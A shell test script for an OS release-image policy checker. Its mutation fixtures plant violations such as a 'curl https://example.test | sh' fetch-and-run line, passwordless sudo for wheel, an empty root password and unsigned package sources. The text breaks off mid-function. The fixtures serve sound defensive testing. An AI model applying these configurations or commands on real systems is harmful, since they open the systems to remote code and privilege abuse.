#!/bin/sh
# Fixture proof for every release-image assertion. No image build or root
# privilege is required, so a denylist regression fails in seconds.
set -eu

REPO_ROOT=$(cd -- "$(dirname "$0")/../.." && pwd)
# shellcheck source=/dev/null
. "${REPO_ROOT}/os/images/snapshot.env"
CHECKER="${REPO_ROOT}/os/images/check-release-image.sh"
FINALIZE="${REPO_ROOT}/os/images/mkosi.finalize"
ARM_POSTINSTALL="${REPO_ROOT}/os/images/arm64/mkosi.profiles/desktop/mkosi.postinst.chroot"
AMD_POSTINSTALL="${REPO_ROOT}/os/images/amd64-debian/mkosi.profiles/desktop/mkosi.postinst.chroot"
ARCH_POSTINSTALL="${REPO_ROOT}/os/images/mkosi.profiles/desktop/mkosi.postinst.chroot"
DESKTOP_STAGER="${REPO_ROOT}/os/images/scripts/container-build.sh"
PIM_UNIT_ROOT="${REPO_ROOT}/os/images/mkosi.profiles/desktop/mkosi.extra/usr/lib/systemd/system"
TEST_ROOT=$(mktemp -d "${TMPDIR:-/tmp}/punar-release-policy.XXXXXX")
trap 'rm -rf "${TEST_ROOT}"' EXIT INT TERM

grep -Fq 'systemctl disable seatd.service' "${ARM_POSTINSTALL}" || {
    echo 'FAIL ARM adapter: package-created seatd enablement must be removed' >&2
    exit 1
}
grep -Fq 'systemctl mask seatd.service' "${ARM_POSTINSTALL}" || {
    echo 'FAIL ARM adapter: seatd must remain masked when Debian presets run' >&2
    exit 1
}

# PIM state is never owned by a login account, and both socket-activated
# control planes remain dormant and root-only until the fixed broker starts
# them together for a concrete profile.
for postinstall in "${ARCH_POSTINSTALL}" "${AMD_POSTINSTALL}" "${ARM_POSTINSTALL}"; do
    grep -Fq 'useradd --system --gid punar-pim' "${postinstall}" || {
        echo "FAIL PIM service: locked account missing from ${postinstall}" >&2
        exit 1
    }
    grep -Fq 'useradd --system --gid punar-mail' "${postinstall}" || {
        echo "FAIL Mail service: locked account missing from ${postinstall}" >&2
        exit 1
    }
    grep -Fq 'useradd --system --gid punar-mail-account' "${postinstall}" || {
        echo "FAIL Mail account entry: locked account missing from ${postinstall}" >&2
        exit 1
    }
    grep -Fq 'useradd --system --gid punar-mail-accounts' "${postinstall}" || {
        echo "FAIL Mail account manager: locked account missing from ${postinstall}" >&2
        exit 1
    }
done
for socket in punar-pimd-application@.socket punar-pimd-account-helper@.socket; do
    unit="${PIM_UNIT_ROOT}/${socket}"
    grep -qx 'SocketUser=root' "${unit}"
    grep -qx 'SocketGroup=root' "${unit}"
    grep -qx 'SocketMode=0600' "${unit}"
    if grep -q '^\[Install\]' "${unit}"; then
        echo "FAIL PIM service: ${socket} must not be image-enabled" >&2
        exit 1
    fi
done
grep -qx 'FileDescriptorName=application' \
    "${PIM_UNIT_ROOT}/punar-pimd-application@.socket"
grep -qx 'FileDescriptorName=account-helper' \
    "${PIM_UNIT_ROOT}/punar-pimd-account-helper@.socket"
grep -qx 'User=punar-pim' "${PIM_UNIT_ROOT}/punar-pimd@.service"
grep -qx 'StateDirectory=punar-pim/%i' "${PIM_UNIT_ROOT}/punar-pimd@.service"
grep -qx 'ProtectSystem=strict' "${PIM_UNIT_ROOT}/punar-pimd@.service"
if grep -q '^\[Install\]' "${PIM_UNIT_ROOT}/punar-pimd@.service"; then
    echo 'FAIL PIM service: profile service must not be image-enabled' >&2
    exit 1
fi
MAIL_SOCKET="${PIM_UNIT_ROOT}/punar-mail@.socket"
MAIL_SERVICE="${PIM_UNIT_ROOT}/punar-mail@.service"
grep -qx 'ListenSequentialPacket=/run/punar-mail-control/%i/launch.sock' "${MAIL_SOCKET}"
grep -qx 'FileDescriptorName=launch' "${MAIL_SOCKET}"
grep -qx 'SocketUser=root' "${MAIL_SOCKET}"
grep -qx 'SocketGroup=root' "${MAIL_SOCKET}"
grep -qx 'SocketMode=0600' "${MAIL_SOCKET}"
grep -qx 'User=punar-mail' "${MAIL_SERVICE}"
grep -qx 'PrivateNetwork=yes' "${MAIL_SERVICE}"
grep -qx 'PrivateDevices=yes' "${MAIL_SERVICE}"
grep -qx 'ProtectSystem=strict' "${MAIL_SERVICE}"
grep -qx 'RestrictAddressFamilies=AF_UNIX' "${MAIL_SERVICE}"
for unit in "${MAIL_SOCKET}" "${MAIL_SERVICE}"; do
    if grep -q '^\[Install\]' "${unit}"; then
        echo "FAIL Mail service: $(basename "${unit}") must not be image-enabled" >&2
        exit 1
    fi
done
ACCOUNTS_SOCKET="${PIM_UNIT_ROOT}/punar-mail-accounts@.socket"
ACCOUNTS_SERVICE="${PIM_UNIT_ROOT}/punar-mail-accounts@.service"
grep -qx 'ListenSequentialPacket=/run/punar-mail-accounts-control/%i/launch.sock' "${ACCOUNTS_SOCKET}"
grep -qx 'FileDescriptorName=launch' "${ACCOUNTS_SOCKET}"
grep -qx 'SocketUser=root' "${ACCOUNTS_SOCKET}"
grep -qx 'SocketGroup=root' "${ACCOUNTS_SOCKET}"
grep -qx 'SocketMode=0600' "${ACCOUNTS_SOCKET}"
grep -qx 'User=punar-mail-accounts' "${ACCOUNTS_SERVICE}"
grep -qx 'PrivateNetwork=yes' "${ACCOUNTS_SERVICE}"
grep -qx 'PrivateDevices=yes' "${ACCOUNTS_SERVICE}"
grep -qx 'ProtectSystem=strict' "${ACCOUNTS_SERVICE}"
grep -qx 'RestrictAddressFamilies=AF_UNIX' "${ACCOUNTS_SERVICE}"
for unit in "${ACCOUNTS_SOCKET}" "${ACCOUNTS_SERVICE}"; do
    if grep -q '^\[Install\]' "${unit}"; then
        echo "FAIL Mail account manager: $(basename "${unit}") must not be image-enabled" >&2
        exit 1
    fi
done
ACCOUNT_SOCKET="${PIM_UNIT_ROOT}/punar-mail-account@.socket"
ACCOUNT_SERVICE="${PIM_UNIT_ROOT}/punar-mail-account@.service"
grep -qx 'ListenSequentialPacket=/run/punar-mail-account-control/%i/launch.sock' "${ACCOUNT_SOCKET}"
grep -qx 'FileDescriptorName=launch' "${ACCOUNT_SOCKET}"
grep -qx 'SocketUser=root' "${ACCOUNT_SOCKET}"
grep -qx 'SocketGroup=root' "${ACCOUNT_SOCKET}"
grep -qx 'SocketMode=0600' "${ACCOUNT_SOCKET}"
grep -qx 'User=punar-mail-account' "${ACCOUNT_SERVICE}"
grep -qx 'PrivateNetwork=yes' "${ACCOUNT_SERVICE}"
grep -qx 'PrivateDevices=yes' "${ACCOUNT_SERVICE}"
grep -qx 'ProtectSystem=strict' "${ACCOUNT_SERVICE}"
grep -qx 'RestrictAddressFamilies=AF_UNIX' "${ACCOUNT_SERVICE}"
for unit in "${ACCOUNT_SOCKET}" "${ACCOUNT_SERVICE}"; do
    if grep -q '^\[Install\]' "${unit}"; then
        echo "FAIL Mail account entry: $(basename "${unit}") must not be image-enabled" >&2
        exit 1
    fi
done
for stager in \
    "${DESKTOP_STAGER}" \
    "${REPO_ROOT}/os/images/amd64-debian/container-build.sh" \
    "${REPO_ROOT}/os/images/arm64/container-build.sh"; do
    grep -Fq 'release/punar-mail-bridge' "${stager}" || {
        echo "FAIL Mail service: bridge binary is not staged by ${stager}" >&2
        exit 1
    }
    grep -Fq 'release/punar-mail-account-bridge' "${stager}" || {
        echo "FAIL Mail account entry: bridge binary is not staged by ${stager}" >&2
        exit 1
    }
    grep -Fq 'release/punar-pim-launch' "${stager}" || {
        echo "FAIL Mail service: privileged launch broker is not staged by ${stager}" >&2
        exit 1
    }
done
# The expansion syntax is the literal staging contract we are searching for.
# shellcheck disable=SC2016
grep -Fq 'install -m 0750 "${cargo_target}/release/punar-pim-launch"' \
    "${DESKTOP_STAGER}" || {
    echo 'FAIL Mail service: privileged broker is not staged root-only' >&2
    exit 1
}
echo 'ok   PIM and Mail services are profile-scoped, root-brokered, hardened and dormant'

# Browser pages used to exercise storage isolation are dev/CI input. Catch a
# destination regression here in seconds rather than after the release image
# has downloaded packages and reached its final tree scan.
grep -Fq "\"\${dev_extra}/usr/share/punar/fixtures/webapps/notes/index.html\"" \
    "${DESKTOP_STAGER}" || {
    echo 'FAIL desktop staging: the M11 fixture is not in the dev overlay' >&2
    exit 1
}
if grep -Fq "\"\${extra}/usr/share/punar/fixtures/webapps/notes/" \
    "${DESKTOP_STAGER}"; then
    echo 'FAIL desktop staging: an M11 fixture entered the release tree' >&2
    exit 1
fi
echo 'ok   browser exercise fixtures are confined to the dev overlay'

# WP-01 shipped files. The clean fixture below is built from these exact
# files, so the clean pass also proves the shipped copies satisfy A16's
# greeter seat, A17, A19, A20 and A21. The checks here add what a fixture cannot: the lanes that must
# compose them, and an early warning before security.txt expires.
DESKTOP_EXTRA="${REPO_ROOT}/os/images/mkosi.profiles/desktop/mkosi.extra"
SHIPPED_RESOLVED="${DESKTOP_EXTRA}/usr/lib/systemd/resolved.conf.d/50-punar.conf"
SHIPPED_SECURITY_TXT="${DESKTOP_EXTRA}/usr/share/punar/security.txt"
SHIPPED_FETCH_UNIT="${DESKTOP_EXTRA}/usr/lib/systemd/system/punar-fetch@.service"
SHIPPED_FETCH_SOCKET="${DESKTOP_EXTRA}/usr/lib/systemd/system/punar-fetch.socket"
SHIPPED_PUNARD_UNIT="${DESKTOP_EXTRA}/usr/lib/systemd/system/punard.service"
SHIPPED_GREETD_PAM="${DESKTOP_EXTRA}/etc/pam.d/greetd"
for lane_conf in \
    "${REPO_ROOT}/os/images/amd64-debian/mkosi.profiles/desktop/mkosi.conf" \
    "${REPO_ROOT}/os/images/arm64/mkosi.profiles/desktop/mkosi.conf"; do
    grep -Fq 'ExtraTrees=../../../mkosi.profiles/desktop/mkosi.extra' "${lane_conf}" || {
        echo "FAIL WP-01: ${lane_conf} no longer composes the shared desktop tree" >&2
        exit 1
    }
done
for postinstall in "${ARCH_POSTINSTALL}" "${AMD_POSTINSTALL}" "${ARM_POSTINSTALL}"; do
    # The expansions are the literal adapter line being searched for.
    # shellcheck disable=SC2016
    grep -Fq 'gpasswd --delete "${member}" "${retired_group}"' "${postinstall}" || {
        echo "FAIL A16 adapter: ${postinstall} does not take the greeter out of input/video" >&2
        exit 1
    }
done
grep -qxF 'Wants=punar-fetch.socket' \
    "${DESKTOP_EXTRA}/usr/lib/systemd/system/punard.service" || {
    echo 'FAIL A19 adapter: punard.service does not pull in the fetch helper socket' >&2
    exit 1
}
for stager in \
    "${DESKTOP_STAGER}" \
    "${REPO_ROOT}/os/images/amd64-debian/container-build.sh" \
    "${REPO_ROOT}/os/images/arm64/container-build.sh"; do
    # shellcheck disable=SC2016
    grep -Fq '"${extra}/usr/lib/punar/punar-fetch"' "${stager}" || {
        echo "FAIL A19 adapter: the fetch helper is not staged by ${stager}" >&2
        exit 1
    }
done
security_expires=$(sed -n 's/^Expires: //p' "${SHIPPED_SECURITY_TXT}")
security_left=$(( ($(date -u -d "${security_expires}" +%s) - $(date -u +%s)) / 86400 ))
if [ "${security_left}" -lt 30 ]; then
    echo "FAIL A20: security.txt expires in ${security_left} days; move its Expires a year on" >&2
    exit 1
fi
security_contacts=$(sed -n 's/^Contact: //p' "${SHIPPED_SECURITY_TXT}")
while IFS= read -r contact; do
    [ -n "${contact}" ] || continue
    grep -Fq -- "${contact#mailto:}" "${REPO_ROOT}/SECURITY.md" || {
        echo "FAIL A20: security.txt names ${contact}, which SECURITY.md does not" >&2
        exit 1
    }
done <<EOF
${security_contacts}
EOF
echo "ok   WP-01 shipped files are composed by every lane; security.txt has ${security_left} days left"

CLEAN="${TEST_ROOT}/clean"
CASE="${TEST_ROOT}/case"
EXPECTED="${TEST_ROOT}/expected-enabled-units.txt"
mkdir -p "${CLEAN}/etc/greetd" "${CLEAN}/etc/sudoers.d" \
    "${CLEAN}/etc/xdg/hypr" \
    "${CLEAN}/usr/lib/systemd/system/multi-user.target.wants" \
    "${CLEAN}/usr/lib/systemd/system/sysinit.target.wants" \
    "${CLEAN}/etc/systemd/system/punard.service.wants" \
    "${CLEAN}/usr/lib/systemd/user/default.target.wants" \
    "${CLEAN}/usr/lib/punar" "${CLEAN}/usr/bin" "${CLEAN}/usr/sbin" \
    "${CLEAN}/usr/share/punar"
for installer_tool in zstd systemd-repart systemd-cryptenroll bootctl; do
    printf '%s\n' '#!/bin/sh' 'exit 0' > "${CLEAN}/usr/bin/${installer_tool}"
    chmod 0755 "${CLEAN}/usr/bin/${installer_tool}"
done
printf '%s\n' '#!/bin/sh' 'exit 0' > "${CLEAN}/usr/sbin/cryptsetup"
chmod 0755 "${CLEAN}/usr/sbin/cryptsetup"
printf '%s\n' 'hl.config({ misc = { disable_hyprland_logo = true } })' \
    > "${CLEAN}/etc/xdg/hypr/hyprland.lua"
printf '%s\n' 'hl.config({ animations = { enabled = false } })' \
    > "${CLEAN}/etc/xdg/hypr/punar-greeter.lua"
printf '%s\n' \
    'root:!:20500:0:99999:7:::' \
    'daemon:*:20500:0:99999:7:::' > "${CLEAN}/etc/shadow"
printf '%s\n' \
    'root:x:0:0:root:/root:/bin/sh' \
    'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin' \
    > "${CLEAN}/etc/passwd"
printf '%s\n' \
    'ID=punar-test-substrate' \
    'VERSION_ID=1' \
    'IMAGE_ID=punar-desktop' \
    "IMAGE_VERSION=${PUNAR_BASE_IMAGE_VERSION}" \
    "PUNAR_SNAPSHOT_PIN=${PUNAR_SNAPSHOT_PIN}" \
    > "${CLEAN}/usr/lib/os-release"
cp "${CLEAN}/usr/lib/os-release" "${CLEAN}/etc/os-release"
printf '%s\n' \
    '[default_session]' \
    'command = "agreety --cmd /usr/lib/punar/session.sh"' \
    'user = "greeter"' > "${CLEAN}/etc/greetd/config.toml"
mkdir -p "${CLEAN}/etc/xdg/hypr"
printf '%s\n' \
    'general {' \
    '    lock_cmd = qs -p /usr/share/punar/shell ipc call lock lock' \
    '}' \
    'listener {' \
    '    timeout = 600' \
    '    on-timeout = loginctl lock-session' \
    '}' > "${CLEAN}/etc/xdg/hypr/punar-hypridle.conf"
mkdir -p "${CLEAN}/etc/security"
printf '%s\n' '# stated lockout policy' 'deny = 5' 'unlock_time = 300' \
    'fail_interval = 900' > "${CLEAN}/etc/security/faillock.conf"
# A16: a greeter and the device groups exist, and nobody is in them.
printf '%s\n' 'greeter:x:960:960::/var/lib/greetd:/usr/sbin/nologin' \
    >> "${CLEAN}/etc/passwd"
printf '%s\n' 'root:x:0:' 'input:x:97:' 'video:x:985:' 'greeter:x:960:' \
    > "${CLEAN}/etc/group"
printf '%s\n' 'root:!::' 'input:!::' 'video:!::' 'greeter:!::' \
    > "${CLEAN}/etc/gshadow"
mkdir -p "${CLEAN}/usr/lib/sysusers.d"
printf '%s\n' 'u greeter - "greetd greeter" /var/lib/greetd' 'm colord video' \
    > "${CLEAN}/usr/lib/sysusers.d/greetd.conf"
# A17: the shipped resolver drop-in.
mkdir -p "${CLEAN}/usr/lib/systemd/resolved.conf.d" "${CLEAN}/etc/systemd"
cp "${SHIPPED_RESOLVED}" "${CLEAN}/usr/lib/systemd/resolved.conf.d/50-punar.conf"
printf '%s\n' '[Resolve]' '#LLMNR=yes' '#MulticastDNS=yes' \
    > "${CLEAN}/etc/systemd/resolved.conf"
# A18: signed sources in each package format the lanes carry.
mkdir -p "${CLEAN}/etc/apt/sources.list.d" "${CLEAN}/etc/apt/apt.conf.d" \
    "${CLEAN}/usr/share/punar/catalog/remotes" "${CLEAN}/var/lib/flatpak/repo"
printf '%s\n' '[options]' 'SigLevel    = Required DatabaseOptional' \
    'LocalFileSigLevel = Optional' '[core]' 'Include = /etc/pacman.d/mirrorlist' \
    > "${CLEAN}/etc/pacman.conf"
printf '%s\n' 'Types: deb' 'URIs: https://deb.debian.org/debian' 'Suites: sid' \
    'Components: main' 'Signed-By: /usr/share/keyrings/debian-archive-keyring.gpg' \
    > "${CLEAN}/etc/apt/sources.list.d/debian.sources"
printf '%s\n' 'APT::Install-Recommends "false";' \
    > "${CLEAN}/etc/apt/apt.conf.d/00-punar"
cp "${REPO_ROOT}/catalog/remotes/flathub.flatpakrepo" \
    "${CLEAN}/usr/share/punar/catalog/remotes/flathub.flatpakrepo"
printf '%s\n' '[remote "flathub"]' 'url=https://dl.flathub.org/repo/' 'gpg-verify=true' \
    'gpg-verify-summary=true' > "${CLEAN}/var/lib/flatpak/repo/config"
# A19: the shipped helper units, a helper that names the downloader, and a
# punard that does not.
cp "${SHIPPED_FETCH_UNIT}" "${CLEAN}/usr/lib/systemd/system/punar-fetch@.service"
cp "${SHIPPED_FETCH_SOCKET}" "${CLEAN}/usr/lib/systemd/system/punar-fetch.socket"
printf '%s\n' 'helper fixture: exec /usr/bin/curl' > "${CLEAN}/usr/lib/punar/punar-fetch"
chmod 0755 "${CLEAN}/usr/lib/punar/punar-fetch"
printf '%s\n' 'punard fixture: no downloader here' > "${CLEAN}/usr/bin/punard"
chmod 0755 "${CLEAN}/usr/bin/punard"
printf '%s\n' '#!/bin/sh' '# a comment may mention curl' 'exec /usr/bin/punarctl status' \
    > "${CLEAN}/usr/lib/punar/session.sh"
chmod 0755 "${CLEAN}/usr/lib/punar/session.sh"
# A20: the shipped security.txt.
cp "${SHIPPED_SECURITY_TXT}" "${CLEAN}/usr/share/punar/security.txt"
# A19 and A21: the shipped punard unit and sign-in PAM stack, and the keyring
# module where Arch installs it.
cp "${SHIPPED_PUNARD_UNIT}" "${CLEAN}/usr/lib/systemd/system/punard.service"
mkdir -p "${CLEAN}/etc/pam.d" "${CLEAN}/usr/lib/security"
cp "${SHIPPED_GREETD_PAM}" "${CLEAN}/etc/pam.d/greetd"
: > "${CLEAN}/usr/lib/security/pam_gnome_keyring.so"
ln -s ../punard.service \
    "${CLEAN}/usr/lib/systemd/system/multi-user.target.wants/punard.service"
printf '%s\n' '[Unit]' 'Description=Punar product helper' \
    > "${CLEAN}/usr/lib/systemd/system/punar-helper.service"
ln -s /usr/lib/systemd/system/punar-helper.service \
    "${CLEAN}/etc/systemd/system/punard.service.wants/punar-helper.service"
printf '%s\n' '[Unit]' 'Description=Punar user product service' \
    > "${CLEAN}/usr/lib/systemd/user/punar-user.service"
ln -s ../punar-user.service \
    "${CLEAN}/usr/lib/systemd/user/default.target.wants/punar-user.service"
printf '%s\n' '[Unit]' 'Description=Harden shared memory' \
    > "${CLEAN}/usr/lib/systemd/system/punar-shm-hardening.service"
ln -s ../punar-shm-hardening.service \
    "${CLEAN}/usr/lib/systemd/system/sysinit.target.wants/punar-shm-hardening.service"
printf '%s\n' \
    'etc/systemd/system/punard.service.wants/punar-helper.service -> /usr/lib/systemd/system/punar-helper.service' \
    'usr/lib/systemd/user/default.target.wants/punar-user.service -> ../punar-user.service' \
    'usr/lib/systemd/system/multi-user.target.wants/punard.service -> ../punard.service' \
    'usr/lib/systemd/system/sysinit.target.wants/punar-shm-hardening.service -> ../punar-shm-hardening.service' \
    > "${EXPECTED}"

KERNEL='console=tty0 systemd.getty_auto=no root=PARTUUID=1beabfe0-9cb8-4b49-91ef-d372b845e7ea rw'

reset_case() {
    rm -rf "${CASE}"
    cp -R "${CLEAN}" "${CASE}"
}

expect_fail() {
    code=$1
    shift
    reset_case
    "$@"
    if "${CHECKER}" "${CASE}" desktop "${KERNEL}" "${EXPECTED}" \
        > "${TEST_ROOT}/stdout" 2> "${TEST_ROOT}/stderr"; then
        echo "FAIL ${code}: checker accepted the violating tree" >&2
        exit 1
    fi
    grep -q "release-image violation ${code}:" "${TEST_ROOT}/stderr" || {
        echo "FAIL ${code}: checker failed without the expected diagnosis" >&2
        cat "${TEST_ROOT}/stderr" >&2
        exit 1
    }
    echo "ok   ${code} rejects its fixture"
}

mutate_a1() { printf '%s\n' 'root::20500:0:99999:7:::' > "${CASE}/etc/shadow"; }
mutate_a0() {
    printf '%s\n' \
        'ID=punar-test-substrate' \
        'VERSION_ID=1' \
        'IMAGE_ID=punar-desktop' \
        'IMAGE_VERSION=latest' \
        "PUNAR_SNAPSHOT_PIN=${PUNAR_SNAPSHOT_PIN}" \
        > "${CASE}/usr/lib/os-release"
}
mutate_a2() { printf '%s\n' 'punar:x:1000:1000::/home/punar:/bin/sh' >> "${CASE}/etc/passwd"; }
mutate_a3() { printf '%s\n' 'punar:100000:65536' > "${CASE}/etc/subuid"; }
mutate_a4() { printf '%s\n' '[initial_session]' >> "${CASE}/etc/greetd/config.toml"; }
mutate_a5() { : > "${CASE}/usr/lib/punar/m10-check.sh"; }
# The development drop-ins live one directory down, in a unit's .d.
mutate_a5_mock_dropin() {
    mkdir -p "${CASE}/usr/lib/systemd/system/punard.service.d"
    : > "${CASE}/usr/lib/systemd/system/punard.service.d/10-mock-control-plane.conf"
}
mutate_a5_timer_dropin() {
    mkdir -p "${CASE}/usr/lib/systemd/system/punard-reconcile.timer.d"
    : > "${CASE}/usr/lib/systemd/system/punard-reconcile.timer.d/10-dev-stoppable.conf"
}
# The sign-in harness the development image carries for the keyring gate.
mutate_a5_signin_probe() {
    mkdir -p "${CASE}/usr/bin"
    : > "${CASE}/usr/bin/punar-signin-probe"
}
mutate_a6() {
    ln -s ../punar-idle-ram.service \
        "${CASE}/usr/lib/systemd/system/multi-user.target.wants/innocent.service"
}
mutate_a7() { printf '%s\n' 'wheel ALL=(ALL) NOPASSWD: ALL' > "${CASE}/etc/sudoers.d/dev"; }
mutate_noop() { :; }
mutate_a9() {
    : > "${CASE}/usr/lib/systemd/user/surprise.service"
    ln -s ../surprise.service \
        "${CASE}/usr/lib/systemd/user/default.target.wants/surprise.service"
}
mutate_a10() {
    mv "${CASE}/etc/xdg/hypr/punar-greeter.lua" \
        "${CASE}/etc/xdg/hypr/punar-greeter.conf"
}
mutate_a11() {
    mkdir -p "${CASE}/var/lib/punar/agents"
    printf '%s\n' '{"session_id":"agt_fixture"}' \
        > "${CASE}/var/lib/punar/agents/registry.jsonl"
}
mutate_a12() { chmod 0644 "${CASE}/usr/bin/systemd-cryptenroll"; }
# A13 has three ways to be wrong and each must bite: no lock at all, a timeout
# so long it is a lock in name only, and a lock routed somewhere other than the
# Punar lock surface.
mutate_a13() { rm -f "${CASE}/etc/xdg/hypr/punar-hypridle.conf"; }
mutate_a13_slow() {
    sed -i 's/timeout = 600/timeout = 86400/' \
        "${CASE}/etc/xdg/hypr/punar-hypridle.conf"
}
mutate_a13_route() {
    sed -i 's|lock_cmd = .*|lock_cmd = /usr/bin/true|' \
        "${CASE}/etc/xdg/hypr/punar-hypridle.conf"
}
# A14 has four ways to be wrong and each must bite: no stated policy at all
# (the state that shipped, where Arch's defaults governed silently), a deny so
# low the machine locks on a single typo, an unlock_time long enough to be
# indistinguishable from a brick, and a policy the lock surface cannot read -
# which would silently return it to the unlabelled "Try again".
mutate_a14() { rm -f "${CASE}/etc/security/faillock.conf"; }
mutate_a14_trigger() {
    sed -i 's/deny = 5/deny = 1/' "${CASE}/etc/security/faillock.conf"
}
mutate_a14_forever() {
    sed -i 's/unlock_time = 300/unlock_time = 86400/' \
        "${CASE}/etc/security/faillock.conf"
}
mutate_a14_unreadable() { chmod 0600 "${CASE}/etc/security/faillock.conf"; }
# A15 has exactly one way to be wrong, and it is the one that matters: the dev
# image's lock-exercise seam surviving into a release tree.
mutate_a15() {
    mkdir -p "${CASE}/usr/lib/punar"
    printf '%s\n' '# leaked from the dev profile' \
        > "${CASE}/usr/lib/punar/lock-exercise.allow"
}

# A16 has four places a membership can come from and each must bite: the
# group file, gshadow's member list, a sysusers.d line systemd-sysusers would
# replay, and userdb records; and a person's account, not only the greeter.
mutate_a16_greeter() { sed -i 's/^video:x:985:$/video:x:985:greeter/' "${CASE}/etc/group"; }
mutate_a16_gshadow() { sed -i 's/^input:!::$/input:!::greeter/' "${CASE}/etc/gshadow"; }
mutate_a16_person() {
    printf '%s\n' 'alice:x:1000:1000::/home/alice:/bin/bash' >> "${CASE}/etc/passwd"
    sed -i 's/^input:x:97:$/input:x:97:alice/' "${CASE}/etc/group"
}
mutate_a16_sysusers() { printf '%s\n' 'm greeter video' >> "${CASE}/usr/lib/sysusers.d/greetd.conf"; }
mutate_a16_membership() {
    mkdir -p "${CASE}/usr/lib/userdb"
    printf '%s\n' '{}' > "${CASE}/usr/lib/userdb/alice:input.membership"
}
mutate_a16_member_of() {
    mkdir -p "${CASE}/etc/userdb"
    printf '%s\n' '{"userName":"alice",' '"memberOf":["punar","video"]}' \
        > "${CASE}/etc/userdb/alice.user"
}
mutate_a16_group_members() {
    mkdir -p "${CASE}/usr/lib/userdb"
    printf '%s\n' '{"groupName":"video","gid":985,' '"members":["alice"]}' \
        > "${CASE}/usr/lib/userdb/video.group"
}
# The greeter's seat: its PAM session must run pam_systemd, directly (Arch)
# or through what greetd-greeter includes (Debian).
mutate_a16_greeter_seat() { sed -i '/pam_systemd\.so/d' "${CASE}/etc/pam.d/greetd"; }
mutate_a16_greeter_include() {
    printf '%s\n' '#%PAM-1.0' '@include login' > "${CASE}/etc/pam.d/greetd-greeter"
    printf '%s\n' 'auth required pam_unix.so' '@include common-session' > "${CASE}/etc/pam.d/login"
    printf '%s\n' 'session required pam_unix.so' > "${CASE}/etc/pam.d/common-session"
}
# A17: the drop-in gone, a protocol left on in it, and a later override.
mutate_a17() { rm -f "${CASE}/usr/lib/systemd/resolved.conf.d/50-punar.conf"; }
mutate_a17_value() {
    sed -i 's/^MulticastDNS=no$/MulticastDNS=resolve/' \
        "${CASE}/usr/lib/systemd/resolved.conf.d/50-punar.conf"
}
mutate_a17_override() {
    mkdir -p "${CASE}/etc/systemd/resolved.conf.d"
    printf '%s\n' '[Resolve]' 'LLMNR=yes' > "${CASE}/etc/systemd/resolved.conf.d/90-lan.conf"
}
# A same-name file that outranks /usr/lib replaces the drop-in whole.
mutate_a17_mask_empty() {
    mkdir -p "${CASE}/etc/systemd/resolved.conf.d"
    : > "${CASE}/etc/systemd/resolved.conf.d/50-punar.conf"
}
mutate_a17_mask_null() {
    mkdir -p "${CASE}/run/systemd/resolved.conf.d"
    ln -s /dev/null "${CASE}/run/systemd/resolved.conf.d/50-punar.conf"
}
mutate_a17_main_file() {
    printf '%s\n' '[Resolve]' 'MulticastDNS=yes' > "${CASE}/usr/lib/systemd/resolved.conf"
}
# A18: one unsigned path per package system.
mutate_a18_pacman() {
    printf '%s\n' '[t2]' 'SigLevel = Never' 'Server = https://example.test/os' \
        >> "${CASE}/etc/pacman.conf"
}
mutate_a18_pacman_optional() {
    sed -i 's/^SigLevel    = Required DatabaseOptional$/SigLevel = Optional TrustAll/' \
        "${CASE}/etc/pacman.conf"
}
mutate_a18_pacman_remote() {
    sed -i 's/^LocalFileSigLevel = Optional$/LocalFileSigLevel = Optional\nRemoteFileSigLevel = Optional/' \
        "${CASE}/etc/pacman.conf"
}
mutate_a18_pacman_mirrorlist() {
    mkdir -p "${CASE}/etc/pacman.d"
    printf '%s\n' 'SigLevel = Never' 'Server = https://example.test/core/os/x86_64' \
        > "${CASE}/etc/pacman.d/mirrorlist"
}
mutate_a18_pacman_include() {
    mkdir -p "${CASE}/usr/share/pacman"
    printf '%s\n' '[extra]' 'Include = /usr/share/pacman/*.conf' >> "${CASE}/etc/pacman.conf"
    printf '%s\n' 'SigLevel = PackageOptional' > "${CASE}/usr/share/pacman/vendor.conf"
}
mutate_a18_apt_list() {
    printf '%s\n' 'deb [trusted=yes] http://example.test/debian sid main' \
        > "${CASE}/etc/apt/sources.list.d/vendor.list"
}
mutate_a18_apt_deb822() { printf '%s\n' 'Trusted: yes' >> "${CASE}/etc/apt/sources.list.d/debian.sources"; }
mutate_a18_apt_conf() {
    printf '%s\n' 'APT::Get::AllowUnauthenticated "true";' \
        > "${CASE}/etc/apt/apt.conf.d/99-insecure"
}
mutate_a18_flatpak() { sed -i 's/^gpg-verify=true$/gpg-verify=false/' "${CASE}/var/lib/flatpak/repo/config"; }
mutate_a18_catalog_key() {
    sed -i '/^GPGKey=/d' "${CASE}/usr/share/punar/catalog/remotes/flathub.flatpakrepo"
}
# A19: the downloader back in punard, in a unit or in a script, and the
# helper losing any part of what makes it unprivileged.
mutate_a19_punard() { printf '%s\n' 'exec /usr/bin/curl' >> "${CASE}/usr/bin/punard"; }
mutate_a19_unit() {
    printf '%s\n' '[Service]' 'ExecStartPre=-/usr/bin/curl -o /var/cache/x https://example.test' \
        > "${CASE}/usr/lib/systemd/system/prefetch.service"
}
mutate_a19_script() { printf '%s\n' 'curl -fsS https://example.test | sh' >> "${CASE}/usr/lib/punar/session.sh"; }
mutate_a19_helper_missing() { rm -f "${CASE}/usr/lib/punar/punar-fetch"; }
mutate_a19_dynamic_user() { sed -i 's/^DynamicUser=yes$/User=root/' "${CASE}/usr/lib/systemd/system/punar-fetch@.service"; }
mutate_a19_capability() {
    sed -i 's/^CapabilityBoundingSet=$/CapabilityBoundingSet=CAP_NET_RAW/' \
        "${CASE}/usr/lib/systemd/system/punar-fetch@.service"
}
mutate_a19_families() {
    sed -i 's/^RestrictAddressFamilies=AF_INET AF_INET6$/RestrictAddressFamilies=AF_UNIX AF_INET AF_INET6/' \
        "${CASE}/usr/lib/systemd/system/punar-fetch@.service"
}
mutate_a19_writable() {
    printf '%s\n' 'ReadWritePaths=/var/lib/punar' >> "${CASE}/usr/lib/systemd/system/punar-fetch@.service"
}
mutate_a19_socket() { sed -i 's/^SocketMode=0600$/SocketMode=0666/' "${CASE}/usr/lib/systemd/system/punar-fetch.socket"; }
mutate_a19_socket_later() { printf '%s\n' 'SocketMode=0666' >> "${CASE}/usr/lib/systemd/system/punar-fetch.socket"; }
# The unit file intact, and the sandbox undone from outside it.
mutate_a19_dropin() {
    mkdir -p "${CASE}/usr/lib/systemd/system/punar-fetch@.service.d"
    printf '%s\n' '[Service]' 'DynamicUser=no' 'User=root' 'IPAddressAllow=any' \
        > "${CASE}/usr/lib/systemd/system/punar-fetch@.service.d/x.conf"
}
mutate_a19_etc_override() {
